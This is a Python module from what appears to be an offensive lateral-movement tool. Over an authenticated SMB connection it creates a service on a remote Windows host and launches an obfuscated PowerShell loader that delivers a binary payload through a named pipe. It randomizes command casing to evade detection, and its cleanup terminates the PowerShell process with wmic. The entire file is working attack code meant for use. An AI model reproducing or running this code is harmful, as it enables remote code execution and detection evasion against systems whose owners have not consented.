# -*- coding: UTF-8 -*-

import logging
import os

from framework import utils
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.helpers import ServiceHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Service + PowerShell (7+)"

    local_loader_path = None
    run_powershell = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "powershell.ps1")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ServiceHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        script = utils.obfuscate_powershell_script(self.opts, self.local_loader_path)
        script = script.replace("THIS_IS_PIKACHU", self.pipe_name)
        command = '{0} "{1}"'.format(utils.random_case("start /b powershell -comma"), script)
        logging.info("Executing PowerShell payload")
        self.helper.execute_command(command)
        self.run_powershell = True
        utils.sleep(3)

    def clean_up(self):
        if self.run_powershell:
            try:
                command = "wmic process where \"name='powershell.exe' " \
                          "and commandline like '%{}%'\" " \
                          "call terminate".format(self.pipe_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)
        self.helper.clean_up()
